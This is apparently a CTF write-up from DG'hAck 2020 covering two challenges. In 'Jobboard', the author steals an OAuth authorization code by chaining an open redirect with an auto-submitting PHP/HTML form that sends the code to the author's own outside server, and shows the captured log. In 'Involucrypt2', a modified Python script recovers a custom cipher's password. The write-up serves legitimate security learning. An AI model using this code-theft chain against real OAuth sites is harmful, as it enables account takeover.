---
title: "DG'hAck: Jobboard and Involucrypt2"
date: 2020-12-04T08:56:30+01:00
summary: "DG'hAck 2020 exercises: Jobboard & Involucrypt2"
categories:
  - dghack2020
---

# Jobboard

Another web challenge. A job posting board.

The website is protected by some oauth login. We can't register on it, but we have a demo account.

To start, I traced down the authentification challenge:

```
POST http://jobboard2.chall.malicecyber.com/oauth/authorize?client_id=svvhKlyEA7qODbl16JTUPQNz&response_type=code&redirect_uri=http%3A%2F%2Fjobboard2.chall.malicecyber.com%2Fconnect%2Fauth%2Fcallback&scope=profile
302 http://jobboard2.chall.malicecyber.com/connect/auth/callback?code=2xRYtOHEKBMVqpjYhzMwmWmCV0BiCgYcSgZq9nzYwCtm8ZAg

GET http://jobboard2.chall.malicecyber.com/connect/auth/callback?code=2xRYtOHEKBMVqpjYhzMwmWmCV0BiCgYcSgZq9nzYwCtm8ZAg
302 /login?access_token=xKAWeUQNnoirx2MjnBVKvZE5sl5Uizyi89hdeqeNZ9&raw%5Baccess_token%5D=xKAWeUQNnoirx2MjnBVKvZE5sl5Uizyi89hdeqeNZ9&raw%5Bexpires_in%5D=864000&raw%5Bscope%5D=profile&raw%5Btoken_type%5D=Bearer

GET http://jobboard2.chall.malicecyber.com/login?access_token=xKAWeUQNnoirx2MjnBVKvZE5sl5Uizyi89hdeqeNZ9&raw%5Baccess_token%5D=xKAWeUQNnoirx2MjnBVKvZE5sl5Uizyi89hdeqeNZ9&raw%5Bexpires_in%5D=864000&raw%5Bscope%5D=profile&raw%5Btoken_type%5D=Bearer
302 ../../

GET http://jobboard2.chall.malicecyber.com/
302 /browse

GET /browse
200
```

There is a contact form. Like previous challenges, sending an URL in it will call it in the target's browser.

The goal here is to retrieve a valid oauth code. The problem is that to do that, you'll need to change the `redirect_uri`, but that field is only accepting whitelisted urls:

```
http://jobboard2.chall.malicecyber.com/oauth/authorize?client_id=svvhKlyEA7qODbl16JTUPQNz&response_type=code&redirect_uri=http://blah.com
renvoie "invalid_request: Invalid "redirect_uri" in request."
```

However, in the app, we see that there is a feature to redirect to other sites: `http://jobboard2.chall.malicecyber.com/safelink/http%3A%2F%2Fexample.com%2F`. It is possible to get a valid `jobboard2.chall.malicecyber.com` link redirecting to a 3rd party website. We'll make use of it to retrieve our code. The final phase is to force user to accept the login automaticaly in the oauth process, and we'll make use of a auto-post form to this:

```php
<?php
$fd = fopen('dump.txt', 'a+');
$d = date(DATE_ATOM);
fwrite($fd, "========== " . $d . " ========\n");
fwrite($fd, json_encode(getallheaders()));
fwrite($fd, "\n==========\n\n");
fclose($fd);

$tartarget_url = urlencode("http://syndevio.com/php/dest.php");
$target_url = urlencode("http://jobboard2.chall.malicecyber.com/safelink/" . $tartarget_url);
$final_url = "http://jobboard2.chall.malicecyber.com/oauth/authorize?client_id=svvhKlyEA7qODbl16JTUPQNz&response_type=code&scope=profile&redirect_uri=" . $target_url;
$realfinal_url = "https://jobboard2.chall.malicecyber.com/safelink/" . urlencode($final_url);

// url for this page: http://syndevio.com/php/index.php
// => get code in logs
// => use code in next url:
// http://jobboard2.chall.malicecyber.com/connect/auth/callback?code=zpxFUTs3YEsXLYOyWhMrgEj4jFl1XUzHgwbJ8aMFfv6N5Wsb
// win!

$redirect = true;
$redirect = true;

?><html>

  <head>
<script type="text/javascript">
function eventFire(el, etype){
  if (el.fireEvent) {
    el.fireEvent('on' + etype);
  } else {
    var evObj = document.createEvent('Events');
    evObj.initEvent(etype, true, false);
    el.dispatchEvent(evObj);
  }
}

window.onload = (event) => {
  console.log('hllo');
  setTimeout(function() {
    var el = document.getElementById('thisone');
    console.log(el);
    el.submit();
  }, 1000);
}
</script>
  </head>

  <body>
    <form method="POST" id="thisone" action="<?php echo $final_url; ?>">
      <input type="hidden" name="confirm" value="Accept">
      <button type="submit" name="confirm" value="Accept">x</button>
    </form>
  </body>
</html>

<!--
<?php
var_dump($target_url);
var_dump($final_url);
?>
```

We send the url to this php script to the target. It will be launched in its browser, and we can check on our webserver logs it worked:

```
==> /var/log/nginx/blah.com_access.log <==
46.30.202.223 - - [25/Nov/2020:13:55:42 +0100] "GET /php/dest.php?code=CZlXBcLdNf11hnJgCpi7r22Y27kfgTEH4EOQBIo2qzyfbGIa HTTP/1.1" 404 242 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.130 Safari/537.36"
```

We have a valid registration code. We just need to use it on the jobboard: `http://jobboard2.chall.malicecyber.com/connect/auth/callback?code=CZlXBcLdNf11hnJgCpi7r22Y27kfgTEH4EOQBIo2qzyfbGIa` and that's it. The flag is `DontRollYourOwn`.


# Involucrypt 2

This cryptography challenge is the follow-up of the first one. But, even if the algo is the exact same, this one has a 1497 long character file to read. Brute forcing is no longer possible as we're facing a 10 character long password.

However, I found out as the algorithm was like: Take a char from the password, create a random engine, crypt the block character & randomly sort all characters in the process, that we could reverse the algorithm, starting from the last block, following the random shift to understand where the characters from the last block crypted were, then xor them with the key generated from all existing printable characters, and found out which character of the password would generate a key decrypting only printable characters.

The process worked quite well, and I was able to rebuild the password. The modified crypt.py was then like:

```python

# Some global values required on the process
keep = False
fields = []
done = 0

... snip ...
# Patching the shuffle function to know where the moved characters are
    def shuffle(self, my_list):
        global keep, fields
        z = len(my_list) - 1

        if keep:
            fields.append(z)

        for i in range(len(my_list) - 1, 0, -1):
            was_i = False
            was_j = False
            j = self.get_rand_int(0, i + 1)
            my_list[i], my_list[j] = my_list[j], my_list[i]

            if keep and i in fields:
                fields.remove(i)
                was_i = True

            if keep and j in fields:
                fields.remove(j)
                was_j = True

            if was_i:
                fields.append(j)
            if was_j:
                fields.append(i)

... snip ...

# New keystream: Basically the same, but we marked keep = True only for the iteration we're in.
def keystream(seeds, length, base=None):
    # Thats a new key: we clean up stuff we want to keep.
    global fields, keep, prefix
    keep = False
    fields = []
    done = 0

    key = base if base else []
    for seed in seeds:
        if done >= len(prefix):
            keep = True
        done = done + 1
        random = mersenne_rng(seed)

        for _ in range(BLOCK):
            if len(key) == length:
                break
            key.append(random.get_rand_int(0, 255))
            random.shuffle(key)
        if len(key) == length:
            break

    return key

... snip ...

prefix = ''
suffix = ''

# The function to search for the password.
while len(suffix) < 10:
    for c in string.printable:
        prefix = 'A' * (10 - len(c+suffix))
        new_key = prefix + c + suffix
        out = list(encrypt(contents, new_key))

        possible = True

        for f in fields:
            if chr(out[f]) not in string.printable:
                possible = False
                break

            if not possible:
                break

        if possible:
            suffix = c + suffix
            print('possible:', new_key, 'new suffix:', suffix)
            break
```

Running it:

```sh
$ pypy3 crypt.py 
possible: AAAAAAAAAi new suffix: i
possible: AAAAAAAAoi new suffix: oi
possible: AAAAAAAtoi new suffix: toi
possible: AAAAAAptoi new suffix: ptoi
possible: AAAAAsptoi new suffix: sptoi
possible: AAAAisptoi new suffix: isptoi
possible: AAAfisptoi new suffix: fisptoi
possible: AAjfisptoi new suffix: jfisptoi
possible: Ajjfisptoi new suffix: jjfisptoi
possible: ajjfisptoi new suffix: ajjfisptoi
```

The password resulting to this was `ajjfisptoi`, and the flag extracted from the crypted file `supahotfire`.
